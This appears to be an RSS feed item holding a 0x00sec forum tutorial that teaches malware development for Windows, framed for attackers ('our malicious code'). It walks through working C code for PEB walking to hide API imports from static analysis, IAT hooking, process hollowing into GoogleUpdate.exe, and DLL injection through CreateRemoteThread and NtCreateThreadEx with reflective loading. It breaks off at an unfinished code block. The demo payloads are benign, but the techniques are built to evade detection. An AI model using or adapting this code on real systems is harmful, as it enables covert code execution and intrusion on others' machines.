<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware Development Essentials for Operators</title>
    <link>https://0x00sec.org/t/malware-development-essentials-for-operators/37769</link>
    <description># Introduction
This article will delve into fundamental and techniques related to malware development for Windows OS, We&#39;ll start by exploring the WinAPI, understanding how code manipulation works in the context of malware development. We&#39;ll cover things like loading functions dynamically, accessing the Process Environment Block (PEB), and executing functions in code, Next  we&#39;ll look into obfuscation and payload encoding. We&#39;ll use techniques like XOR and AES encryption to make our malicious code harder to detect. We&#39;ll also explore ways to insert our malicious code, like using classic shellcode and DLL injections To wrap things up, we&#39;ll create a simple rootkit, concluding our journey through the world of malware development, As usual, we will delve into the code and techniques, providing a detailed, step-by-step breakdown.

# Dynamic Function Loading and Execution
Time to dive into some naked code action! We&#39;re gonna break down this code and make it crystal clear, so you can get what&#39;s going on.

```c
int main(void) {
MessageBoxA(0, &quot;Foo Here.&quot;, &quot;info&quot;, 0);
return 0;
}
```

This is a simple program. It uses the `MessageBoxA` function, which is part of the Windows API. This function displays a modal dialog box with specified text and a caption. In this code, we&#39;re making a straightforward call to the `MessageBoxA` function to show a message box.

The `MessageBoxA` function is statically linked to your program during the compilation process. This means that the function&#39;s code is included in your program, so you don&#39;t need to load it at runtime.

Now, let&#39;s contrast this with the following code:

```c
int main(void) {
size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA(&quot;USER32.dll&quot;), &quot;MessageBoxA&quot; );
def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;
msgbox_a(0, &quot;Foo Here.&quot;, &quot;info&quot;, 0);
return 0;
}
```

In this code, we take a different approach. We dynamically load and call the `MessageBoxA` function using the `GetProcAddress` function. This function retrieves the address of the `MessageBoxA` function from the USER32.dll library at runtime.

To work with this dynamically loaded function, we define a function pointer type `def_MessageBoxA` that matches the signature of the `MessageBoxA` function. We then cast the obtained function address to this function pointer and use it to call the function.

So, how is this related to malware? Well, by dynamically loading functions, we can avoid having to statically link to libraries that are associated with shady activity, meaning that hooking a function dynamically with the use of pointers can make it more challenging for static analysis tools to identify the behavior of the code. Let&#39;s Take an example: 

```c
__declspec(dllexport) void func01() { MessageBoxA(0, &quot;&quot;, &quot;Function 1&quot;, 0); }
__declspec(dllexport) void func02() { MessageBoxA(0, &quot;&quot;, &quot;Function 2&quot;, 0); }

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Hook function func01
    }
    return TRUE;
}
```

In this example, we have a DLL with two exported functions, `func01` and `func02`. Initially, both functions display message boxes. However, in the `DllMain` function, which is automatically executed when the DLL is loaded may start with benign functionality but could use dynamic function loading and function hooking to change the behavior of `func01` at runtime. So, let&#39;s continue on this code manipulation journey, exploring the intricacies of dynamic function loading, PEB access, and function execution, which are essential concepts in understanding how code can be adapted and manipulated. 

Before, continuing I would like to highlight in which step PEB is created on process creation When _Starting a program_ (calc.exe for example): calc.exe will call a win32 API function : **CreateProcess** which sends to the OS the request to create this process and start the execution.

Creating the process data structures: Windows creates the process structure **EPROCESS** on kernel land for the newly created calc.exe process, Initialize the virtual memory: Then, Windows creates the process, virtual memory, and its representation of the physical memory and saves it inside the **EPROCESS** structure, `creates the PEB structure with all necessary information, and then loads the main two DLLs that Windows applications will always need, which are ntdll.dll and kernel32.dll` and finally loading the PE file and start the execution.

- **PEB** can be accessed from **User Mode** - Contains Process specific information
- **EPROCESS** can be only be accessed from **Kernel Mode**
### PEB Structure

PEB is a data structure in the Windows operating system that contains information and settings related to a running process, The process control block contains data that is only useful to the kernel, such as the preferred CPU for this process. The Thread Control Block is entirely different, and is what the kernel uses to manage threads, which are what the kernel runs at the lowest level.

the PEB is accessed to retrieve information about loaded modules, specifically the base addresses of dynamically linked libraries (DLLs). Let&#39;s explore how the PEB is used in the code:

```c
typedef struct _PEB_LDR_DATA {
ULONG Length;
UCHAR Initialized;
PVOID SsHandle;
LIST_ENTRY InLoadOrderModuleList;
LIST_ENTRY InMemoryOrderModuleList;
LIST_ENTRY InInitializationOrderModuleList;
PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA; 

typedef struct _UNICODE_STRING32 {
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING32, *PUNICODE_STRING32;

typedef struct _PEB32 {
    // ...
} PEB32, *PPEB32;

typedef struct _PEB_LDR_DATA32 {
    // ...
} PEB_LDR_DATA32, *PPEB_LDR_DATA32;

typedef struct _LDR_DATA_TABLE_ENTRY32 {
    // ...
} LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32;
```

As you can see, the PEB is a robust structure. The code defines several structures, such as `PEB32`, `PEB_LDR_DATA32`, and `LDR_DATA_TABLE_ENTRY32`, which are simplified versions of the actual PEB data structures. These structures contain fields that hold information about loaded modules and their locations in memory.

```c
size_t GetModHandle(wchar_t *libName) {
PEB32 *pPEB = (PEB32 *)__readfsdword(0x30); // ds: fs[0x30]
PLIST_ENTRY header = &amp;(pPEB-&gt;Ldr-&gt;InMemoryOrderModuleList);

for (PLIST_ENTRY curr = header-&gt;Flink; curr != header; curr = curr-&gt;Flink) {
LDR_DATA_TABLE_ENTRY32 *data = CONTAINING_RECORD(
curr, LDR_DATA_TABLE_ENTRY32, InMemoryOrderLinks

);
printf(&quot;current node: %ls\n&quot;, data-&gt;BaseDllName.Buffer);
if (StrStrIW(libName, data-&gt;BaseDllName.Buffer))
return data-&gt;DllBase;
}
return 0;
}
```

The `GetModHandle` function accesses the PEB to find the base address of a loaded module. The PEB contains a data structure called `PEB_LDR_DATA` that manages information about loaded modules. The `InMemoryOrderModuleList` field of this structure is a linked list of loaded modules. The `GetModHandle` function iterates through this list and compares module names to find the desired module based on the `libName` parameter.

The PEB can be found at fs:[0x30] in the Thread Environment Block for x86 processes as well as at GS:[0x60] for x64 processes.

Next we call the `GetFuncAddr`function which well be used to locate the address of a specific function within a loaded module. It takes the `moduleBase` parameter, which is the base address of the module, and it looks into the export table of the module to find the address of the function with the specified name (`szFuncName`). The export table is part of the module&#39;s data structure, which is managed by the PEB.

```
size_t GetFuncAddr(size_t moduleBase, char* szFuncName) {

// parse export table
PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(moduleBase);
PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(moduleBase + dosHdr-&gt;e_lfanew);
IMAGE_OPTIONAL_HEADER optHdr = ntHdr-&gt;OptionalHeader;
IMAGE_DATA_DIRECTORY dataDir_exportDir = optHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

// parse exported function info

PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + dataDir_exportDir.VirtualAddress);
DWORD* arrFuncs = (DWORD *)(moduleBase + exportTable-&gt;AddressOfFunctions);
DWORD* arrNames = (DWORD *)(moduleBase + exportTable-&gt;AddressOfNames);
WORD* arrNameOrds = (WORD *)(moduleBase + exportTable-&gt;AddressOfNameOrdinals);
```

The function begins by parsing the export table of the loaded module to access information about its exported functions. The export table is part of the Portable Executable (PE) file format and contains details about functions that can be accessed externally. 

1. accesses the DOS header and the NT header to navigate to the Optional Header of the PE file.
2. identifies the data directory for exports using the `IMAGE_DIRECTORY_ENTRY_EXPORT` index from the Optional Header&#39;s data directory array.
3. calculates the address of the export table, which holds data related to the module&#39;s exported functions.

Next, inside the loop, it compares the current exported function&#39;s name (`sz_CurrApiName`) with the target function name (`szFuncName`) using a case-insensitive comparison. When a match is found, the function prints information about the matching function, including its name and ordinal.

```c
// lookup
for (size_t i = 0; i &lt; exportTable-&gt;NumberOfNames; i++) {
char* sz_CurrApiName = (char *)(moduleBase + arrNames[i]);
WORD num_CurrApiOrdinal = arrNameOrds[i] + 1;
if (!stricmp(sz_CurrApiName, szFuncName)) {
printf(&quot;[+] Found ordinal %.4x - %s\n&quot;, num_CurrApiOrdinal, sz_CurrApiName); //enumeration process 
return moduleBase + arrFuncs[ num_CurrApiOrdinal - 1 ];
}
}
return 0;
}
```

If the target function name matches the current function name, the function returns the address of that function. It calculates the function&#39;s address by referencing the `arrFuncs` array and the ordinal. The ordinal, when converted to an index, helps retrieve the correct address from the array.

Why is This Important this technique is usually how code injection is preformed and yes dynamic function loading, now Let&#39;s take a look at main function.  

```c
int main(int argc, char** argv, char* envp) {
    size_t kernelBase = GetModHandle(L&quot;kernel32.dll&quot;);
    printf(&quot;[+] GetModHandle(kernel32.dll) = %p\n&quot;, kernelBase); // result of the `GetModHandle` 
    
    size_t ptr_WinExec = (size_t)GetFuncAddr(kernelBase, &quot;WinExec&quot;);
    printf(&quot;[+] GetFuncAddr(kernel32.dll, WinExec) = %p\n&quot;, ptr_WinExec); // the address of the `WinExec`
    ((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)(&quot;calc&quot;, SW_SHOW); 
    return 0;
}
```

We calls the `GetModHandle` function to find the base address of the &quot;kernel32.dll&quot; module in the current process. It uses the PEB to traverse the list of loaded modules and search for the one with the specified name (&quot;kernel32.dll&quot;), Next we calls the `GetFuncAddr`  to locate the address of the `WinExec`, passes the base address of &quot;kernel32.dll&quot; obtained in the previous step and the function name &quot;WinExec&quot; as arguments and Finally, the code dynamically invokes the `WinExec` function using the address obtained earlier. It casts the `ptr_WinExec` to the appropriate function pointer type and calls it with the arguments &quot;calc&quot; (to run the Windows Calculator) and `SW_SHOW` 

Demonstrates how to dynamically locate and execute the `WinExec` function from the &quot;kernel32.dll&quot; module, effectively opening the Calculator This shows how code manipulation can be achieved by accessing the PEB and locating and using specific functions from loaded modules.

Alright let&#39;s back up a little bit here &quot;Code Injection&quot; Here&#39;s the section to explain and explore further in the context of code injection:

```c
((UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec)(&quot;calc&quot;, SW_SHOW);
```

This line dynamically invokes the `WinExec` function to open the Windows Calculator. Now, let&#39;s break down what&#39;s happening here:

- `(UINT(WINAPI*)(LPCSTR, UINT))ptr_WinExec` involves typecasting the `ptr_WinExec` pointer into a function pointer with the appropriate signature. This typecasting is crucial to match the required parameters of the `WinExec` function, which includes a string (LPCSTR) and an integer (UINT).

- `(&quot;calc&quot;, SW_SHOW)` represents the arguments passed to the `WinExec` function. In this instance, it instructs the system to open the Windows Calculator (&quot;calc&quot;) with a specified display mode (`SW_SHOW`).

In essence, what&#39;s occurring here is:

The code dynamically injects the execution of the `WinExec` function into the context of a legitimate process. Rather than statically linking to the `WinExec` function, this code locates and invokes it dynamically. Dynamic function loading is a technique often employed in malware to access specific functions without the need for direct imports, making it more evasive.

It&#39;s important to note that in this code example, opening the Windows Calculator is a benign action. However, it serves as an illustrative case of code injection and dynamic function invocation. 

# Dynamic Function Loading (IAT Hooking)

Dynamic Function Loading is a technique used in the realm of Windows programming and sometimes in malware development to load and execute functions at runtime. One way to achieve this is through &quot;Import Address Table (IAT) Hooking.&quot; The IAT contains the addresses of functions that a module (such as a DLL or executable) imports from other modules. IAT hooking allows us to intercept and modify function calls by manipulating the IAT. 

IAT table looks something like:

```
                Application                                               mydll
           +-------------------+                                  +--------------------+
           |                   |                                  |       MessageBoxA  |
           |                   |                    +------------&gt;---------------------+
           | call MessageBoxA  |               IAT  |             |  ....              |
           |                   |       +-------------------+      |(kernel32!MsgBoxA)  |
           +-------------------+       |            |      |      |  ....              |
                             +----------&gt; jmp       +      |      +--------------------+
                                       |                   |      |                    |
                                       +-------------------+      +--------------------+
```

First the target program calls a WinAPI `MessageBoxA` function, the program looks up the `MessageBoxA` address in the IAT and code execution jumps to the `kernel32!MessageBoxA` address resolved in step 2 where legitimate code for displaying the `MessageBoxA` , Here&#39;s how the IAT table works in the context of a call to a function like `MessageBoxA`:

```c
#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS))
```

The application code makes a function call to `MessageBoxA`. This call is typically made using a function or API from a Windows library, When the application code makes a function call, it does not directly call the function&#39;s code. Instead, it looks up the address of the function in the IAT, which contains entries for various imported functions. Once the address of `MessageBoxA` is resolved in the IAT, the code execution jumps to that resolved address. In this case, the resolved address points to the legitimate `kernel32!MessageBoxA` function.

```c
size_t ptr_msgboxa = 0;
void iatHook(char *module, const char *szHook_ApiName, size_t callback, size_t &amp;apiAddr)
{
    auto dir_ImportTable = getNtHdr(module)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto impModuleList = (IMAGE_IMPORT_DESCRIPTOR *)&amp;module[dir_ImportTable.VirtualAddress];
    for (; impModuleList-&gt;Name; impModuleList++)
    {
        auto arr_callVia = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;FirstThunk];
        auto arr_apiNames = (IMAGE_THUNK_DATA *)&amp;module[impModuleList-&gt;OriginalFirstThunk];
        for (int i = 0; arr_apiNames[i].u1.Function; i++)
        {
            auto curr_impApi = (PIMAGE_IMPORT_BY_NAME)&amp;module[arr_apiNames[i].u1.Function];
            if (!strcmp(szHook_ApiName, (char *)curr_impApi-&gt;Name))
            {
                apiAddr = arr_callVia[i].u1.Function;
                arr_callVia[i].u1.Function = callback;
                break;
            }
        }
    }
}

int main(int argc, char **argv)
{
    void (*ptr)(UINT, LPCSTR, LPCSTR, UINT) = [](UINT hwnd, LPCSTR lpText, LPCSTR lpTitle, UINT uType) {
        printf(&quot;[hook] MessageBoxA(%i, \&quot;%s\&quot;, \&quot;%s\&quot;, %i)&quot;, hwnd, lpText, lpTitle, uType);
        ((UINT(*)(UINT, LPCSTR, LPCSTR, UINT))ptr_msgboxa)(hwnd, &quot;msgbox got hooked&quot;, &quot;alert&quot;, uType);
    };

    iatHook((char *)GetModuleHandle(NULL), &quot;MessageBoxA&quot;, (size_t)ptr, ptr_msgboxa);
    MessageBoxA(0, &quot;Hook Test&quot;, &quot;title&quot;, 0);
    return 0;
}
```

So What&#39;s Going on Here? Instead of executing the legitimate `kernel32!MessageBoxA` function, the IAT entry for `MessageBoxA` is modified to point to a replacement function (the `ptr` function in the code). As a result, when the application makes a call to `MessageBoxA`, it actually calls the replacement function, which can alter or extend the behavior of the original function call.
# Process Hollowing

So, Process hollowing is a technique that begins with the creation of a new instance of a legitimate process in a suspended state, The suspended state allows the injected code to be executed within the context of this process. 

To successfully perform process hollowing, the source image (the executable being injected into the legitimate process) must meet specific requirements and characteristics to ensure that the technique works effectively. These requirements include:

1. **PE Format:** The source image must be in the Portable Executable (PE) format, which is the standard executable file format on Windows. This format includes headers and sections that define the structure of the executable.
2. **Executable Code:** The source image should contain executable code that can be run by the Windows operating system. This code is typically located within the `.text` section of the PE file.
3. **Address of Entry Point:** The PE header of the source image must specify the address of the entry point, which is the starting point for the execution of the code. The address of the entry point is used to set the `EAX` register in the context of the suspended process.
4. **Sections and Data:** The source image should contain necessary sections, such as the `.text` section for code and other sections for data. These sections should be properly defined in the PE header, and the data should be accessible and relevant to the code&#39;s execution.
5. **Relocation Table:** The source image may have a relocation table that allows it to be loaded at a different base address. If the source image lacks a relocation table, it may only work if it can be loaded at its preferred base address.

Creating The Process The target process must be created in the suspended state, The code aims to create a new instance of a process in a suspended state and subsequently replace its code and data with the code and data from another executable (the source image), which includes creating a suspended process and performing memory operations to load the new image.

```c
// Create a new instance of current process in suspended state, for the new image.
if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &amp;SI, &amp;PI)) 
{
    // Allocate memory for the context.
    CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
    CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated

    // Retrieve the context.
    if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
    {
        pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),
            NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

        // File Mapping
        WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);
        for (int i = 0; i &lt; NtHeader-&gt;FileHeader.NumberOfSections; i++)
            WriteProcessMemory
            (
                PI.hProcess, 
                LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
                LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
                SectionHeader[i].SizeOfRawData, 
                0
            );
    }
}
```

Alright `CreateProcessA` function is used to create a new instance of the current process (or another specified executable) in a suspended state. The `CREATE_SUSPENDED` flag is used to create the process in a suspended state, meaning its execution is paused, After creating the suspended process, memory is allocated using `VirtualAlloc` to hold the context of the suspended process. The context structure (`CTX`) is used to capture information about the process&#39;s execution state. 

**Retrieving and Updating Context**
- `GetThreadContext` function is called to retrieve the context of the suspended process&#39;s main thread (`PI.hThread`). The context is stored in the `CTX` structure.
- The context is updated to prepare for the execution of the new code. Specifically, the `EAX` register is set to the address of the entry point of the new code, Next the code then proceeds to copy the headers (PE header) of the source image into the allocated memory within the suspended process using `WriteProcessMemory`. This is crucial for ensuring that the new image is loaded correctly, A loop iterates through the sections of the source image (`SectionHeader`) and copies the section data from the source image to corresponding memory locations within the suspended process using `WriteProcessMemory`. This step is essential to load the code and data.

At this point, the process hollowing process is set up, and the new image&#39;s code and data have been loaded into the memory of the suspended process. The code execution will continue from this point, allowing the new image to execute within the context of the suspended process.

```c
WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;pImageBase), 4, 0);
CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
ResumeThread(PI.hThread);
```

The destination address is calculated as `CTX-&gt;Ebx + 8`, and 4 bytes of data are written. This memory write operation sets the location where the process should begin execution of the new code.

`CTX-&gt;Eax` is updated with the address of the new code&#39;s entry point. This effectively sets the instruction pointer (`EIP`) to the starting point of the loaded code. The entry point address is obtained from the PE header of the source image: `NtHeader-&gt;OptionalHeader.AddressOfEntryPoint`. Finally, the `ResumeThread` function is called to resume the execution of the suspended process. At this point, the process begins executing the injected code, starting from the entry point that was set, The injected code within the suspended process will now take control of the process&#39;s execution.

```c
char CurrentFilePath[MAX_PATH + 1];
GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
if (strstr(CurrentFilePath, &quot;GoogleUpdate.exe&quot;)) {
MessageBoxA(0, &quot;foo&quot;, &quot;&quot;, 0);
return 0;

LONGLONG len = -1;
RunPortableExecutable(&quot;GoogleUpdate.exe&quot;, MapFileToMemory(CurrentFilePath, len));
return 0;
}
```

Once the application is run is used to retrieve the full path of the currently running executable (the application itself), There is a conditional check using `strstr` to examine the `CurrentFilePath`. If the file path contains &quot;GoogleUpdate.exe,&quot; it displays a message box with the title and the message &quot;foo&quot; using the `MessageBoxA` function, If the file path doesn&#39;t match the condition, the code continues to execute. It proceeds to call the `RunPortableExecutable` function, The target process for process hollowing is specified as &quot;GoogleUpdate.exe.&quot; It passes the source image, Otherwise, it proceeds with the process hollowing technique to inject and run code from another executable. This is a simple example. 
# DLL injection Techniques

DLL injection is the act of introducing code into a currently executing process. Typically, the code we introduce takes the form of a dynamic link library (DLL) since DLLs are designed to be loaded as needed during runtime. However, this doesn&#39;t preclude us from injecting assembly code or other forms of code (such as executables or handwritten code). It&#39;s crucial to bear in mind that you must possess the necessary level of privileges on the system to engage in memory manipulation within other programs.

The Windows API provides a range of functions that enable us to attach to and manipulate other programs, primarily for debugging purposes. We will make use of these methods to execute DLL injection. I&#39;ve divided the DLL injection process into four distinct steps:

1. **Attach** to the process
2. **Allocate** Memory within the process
3. **Copy** the DLL or the DLL Path into the processes memory and determine appropriate memory addresses
4. Instruct the process to **Execute** your DLL

Each one of these steps can be accomplished through the use of one or more programming techniques which are summarized in the below graphic. It&#39;s important to understand the details/options present for each technique as they all have their positives and negatives.

- **LoadLibrary:** Using the `LoadLibrary` function to load a DLL into a process.
- **CreateRemoteThread:** Injecting a DLL using the `CreateRemoteThread` function.
- **SetWindowsHookEx:** Using Windows hooks to inject code into other processes.
- **Process Hollowing:** Replacing the code and data of a legitimate process with a malicious DLL.

We have a couple of options (e.g. `CreateRemoteThread()`,`NtCreateThreadEx()`, etc...) when instructing the target process to launch our DLL. Unfortunately we can&#39;t just provide the name of our DLL to these functions, instead we have to provide a memory address to start execution at. We perform the **Allocate** and **Copy** steps to obtain space within the target process&#39; memory and prepare it as an execution starting point.
  
There are two popular starting points: `LoadLibraryA()` and jumping to `DllMain`.
#### `LoadLibraryA()`

[`LoadLibraryA()`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175%28v=vs.85%29.aspx) is a `kernel32.dll` function used to load DLLs, executables, and other supporting libraries at run time. It takes a filename as its only parameter and magically makes everything work. This means that we just need to allocate some memory for the path to our DLL and set our execution starting point to the address of `LoadLibraryA()`, providing the memory address where the path lies as a parameter.  
  
The major downside to `LoadLibraryA()` is that it registers the loaded DLL with the program and thus can be easily detected. Another slightly annoying caveat is that if a DLL has already been loaded once with `LoadLibraryA()`, it will not execute it. You can work around this issue but it&#39;s more code.  
#### Jumping to `DllMain` (or another entry point)

An alternative method to `LoadLibraryA()` is load the entire DLL into memory, then determine the offset to the [DLL&#39;s entry point](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx). Using this method you can avoid registering the DLL with the program (stealthy) and repeatedly inject into a process.
### Attaching to the Process

First we&#39;ll need a [handle](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724176%28v=vs.85%29.aspx) to the process so that we can interact with it. This is done with the [OpenProcess()](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320%28v=vs.85%29.aspx) function. We&#39;ll also need request certain [access rights](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx) in order for us to perform the tasks below. The specific access rights we request vary across Windows versions, however the following should work for most:

```c
hHandle = OpenProcess( PROCESS_CREATE_THREAD | 
                       PROCESS_QUERY_INFORMATION | 
                       PROCESS_VM_OPERATION | 
                       PROCESS_VM_WRITE | 
                       PROCESS_VM_READ, 
                       FALSE, 
                       procID );
```

Before we can inject anything into another process, we&#39;ll need a place to put it. We&#39;ll use the [`VirtualAllocEx()`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366890%28v=vs.85%29.aspx) function to do so.  
  
`VirtualAllocEx()` takes amount of memory to allocate as one of its parameters. If we use `LoadLibraryA()`, we&#39;ll allocate space for the full path of the DLL and if we jump to the `DllMain`, we&#39;ll allocate space for the DLL&#39;s full contents.  
### DLL Path

Allocating space for just the DLL path slightly reduces the amount of code you&#39;ll need to write but not by much. It also requires you to use the `LoadLibraryA()` method which has some downsides (described above). That being said, it is a very popular method.  
  
Use `VirtualAllocEx()` and allocate enough memory to support a string which contains the path to the DLL:

```c
GetFullPathName(TEXT(&quot;foo.dll&quot;), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

dllPathAddr = VirtualAllocEx(hHandle, 
                             0, 
                             strlen(dllPath), 
                             MEM_RESERVE|MEM_COMMIT, 
                             PAGE_EXECUTE_READWRITE);
```

### Full DLL

Allocating space for the full DLL requires a little more code however it&#39;s also much more reliable and doesn&#39;t need to use `LoadLibraryA()`.  
  
First, open a handle to the DLL with `CreateFileA()` then calculate its size with `GetFileSize()` and pass it to `VirtualAllocEx()`:  
  

```c

GetFullPathName(TEXT(&quot;foo.dll&quot;), 
                BUFSIZE, 
                dllPath, //Output to save the full DLL path
                NULL);

hFile = CreateFileA( dllPath, 
                     GENERIC_READ, 
                     0, 
                     NULL, 
                     OPEN_EXISTING, 
                     FILE_ATTRIBUTE_NORMAL, 
                     NULL );

dllFileLength = GetFileSize( hFile, 
                             NULL );

remoteDllAddr = VirtualAllocEx( hProcess, 
                                NULL, 
                                dllFileLength, 
                                MEM_RESERVE|MEM_COMMIT, 
                                PAGE_EXECUTE_READWRITE ); 

```

Now that we have space allocated in our target process, we can copy our DLL Path or the Full DLL (depending on the method you choose) into that process. We&#39;ll use [WriteProcessMemory()](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx) to do so:  

### DLL Path

```c

WriteProcessMemory(hHandle, 
                   dllPathAddr, 
                   dllPath, 
                   strlen(dllPath), 
                   NULL);

```

### Full DLL

We&#39;ll first need to read our DLL into memory before we copy it to the remote processes.  

```c

lpBuffer = HeapAlloc( GetProcessHeap(), 
                      0, 
                      dllFileLength); 

ReadFile( hFile, 
          lpBuffer, 
          dllFileLength, 
          &amp;dwBytesRead;, 
          NULL );

WriteProcessMemory( hProcess, 
                    lpRemoteLibraryBuffer, 
                    lpBuffer,  
                    dllFileLength, 
                    NULL );

```  
### Determining our Execution Starting Point
Most execution functions take a memory address to start at, so we&#39;ll need to determine what that will be.  
### DLL Path and `LoadLibraryA()`
We&#39;ll search our own process memory for the starting address of `LoadLibraryA()`, then pass it to our execution function with the memory address of DLL Path as it&#39;s parameter. To get `LoadLibraryA()`&#39;s address, we&#39;ll use `GetModuleHandle()` and `GetProcAddress()`:  
  

```c
loadLibAddr = GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)), &quot;LoadLibraryA&quot;);
```
### Full DLL and Jump to `DllMain`
By copying the entire DLL into memory we can avoid registering our DLL with the process and more reliably inject. The somewhat difficult part of doing this is obtaining the entry point to our DLL when it&#39;s loaded in memory. So we&#39;ll use the `GetReflectiveLoaderOffset()` from it to determine our offset in our processes memory then use that offset plus the base address of the memory in the victim process we wrote our DLL to as the execution starting point. It&#39;s important to note here that the DLL we&#39;re injecting must complied with the appropriate includes and options so that it aligns itself with the ReflectiveDLLInjection method.  
  

```
dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpWriteBuff);
```

### Executing the DLL!
At this point we have our DLL in memory and we know the memory address we&#39;d like to start execution at. All that&#39;s really left is to tell our process to execute it. There are a couple of ways to do this.  
#### `CreateRemoteThread()`
The [`CreateRemoteThread()`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx) function is probably the most widely known and used method. It&#39;s very reliable and works most times however you may want to use another method to avoid detection or if Microsoft changes something to cause `CreateRemoteThread()` to stop working.  
  
Since `CreateRemoteThread()` is a very established function, you have a greater flexibility in how you use it. For instance, you can do things like use Python to do DLL injection!  

```
rThread = CreateRemoteThread(hTargetProcHandle, NULL, 0, lpStartExecAddr, lpExecParam, 0, NULL);
WaitForSingleObject(rThread, INFINITE);
```
#### `NtCreateThreadEx()`
`NtCreateThreadEx()` is an undocumented `ntdll.dll` function. The trouble with undocumented functions is that they may disappear or change at any moment Microsoft decides. That being said, `NtCreateThreadEx()` came in good handy when Windows session separation affected `CreateRemoteThread()` DLL injection.

`NtCreateThreadEx()` is a bit more complicated to call, we&#39;ll need a specific structure to pass to it and another to receive data from it. I&#39;ve detailed the implementation here:  
  
```c
struct NtCreateThreadExBuffer {
 ULONG Size;
 ULONG Unknown1;
 ULONG Unknown2;
 PULONG Unknown3;
 ULONG Unknown4;
 ULONG Unknown5;
 ULONG Unknown6;
 PULONG Unknown7;
 ULONG Unknown8;
 }; 


typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) (
 OUT PHANDLE hThread,
 IN ACCESS_MASK DesiredAccess,
 IN LPVOID ObjectAttributes,
 IN HANDLE ProcessHandle,
 IN LPTHREAD_START_ROUTINE lpStartAddress,
 IN LPVOID lpParameter,
 IN BOOL CreateSuspended,
 IN ULONG StackZeroBits,
 IN ULONG SizeOfStackCommit,
 IN ULONG SizeOfStackReserve,
 OUT LPVOID lpBytesBuffer
);

HANDLE bCreateRemoteThread(HANDLE hHandle, LPVOID loadLibAddr, LPVOID dllPathAddr) {

 HANDLE hRemoteThread = NULL;

 LPVOID ntCreateThreadExAddr = NULL;
 NtCreateThreadExBuffer ntbuffer;
 DWORD temp1 = 0; 
 DWORD temp2 = 0; 

 ntCreateThreadExAddr = GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll.dll&quot;)), &quot;NtCreateThreadEx&quot;);

 if( ntCreateThreadExAddr ) {
 
  ntbuffer.Size = sizeof(struct NtCreateThreadExBuffer);
  ntbuffer.Unknown1 = 0x10003;
  ntbuffer.Unknown2 = 0x8;
  ntbuffer.Unknown3 = &amp;temp2;
  ntbuffer.Unknown4 = 0;
  ntbuffer.Unknown5 = 0x10004;
  ntbuffer.Unknown6 = 4;
  ntbuffer.Unknown7 = &amp;temp1;
  ntbuffer.Unknown8 = 0;

  LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;
  NTSTATUS status = funNtCreateThreadEx(
          &amp;hRemoteThread;,
          0x1FFFFF,
          NULL,
          hHandle,
          (LPTHREAD_START_ROUTINE)loadLibAddr,
          dllPathAddr,
          FALSE,
          NULL,
          NULL,
          NULL,
          &amp;ntbuffer;
          );
  
  if (hRemoteThread == NULL) {
   printf(&quot;\t[!] NtCreateThreadEx Failed! [%d][%08x]\n&quot;, GetLastError(), status);
   return NULL;
  } else {
   return hRemoteThread;
  }
 } else {
  printf(&quot;\n[!] Could not find NtCreateThreadEx!\n&quot;);
 }
 return NULL;

}
```

Now we can call it very much like `CreateRemoteThread()`:

```c
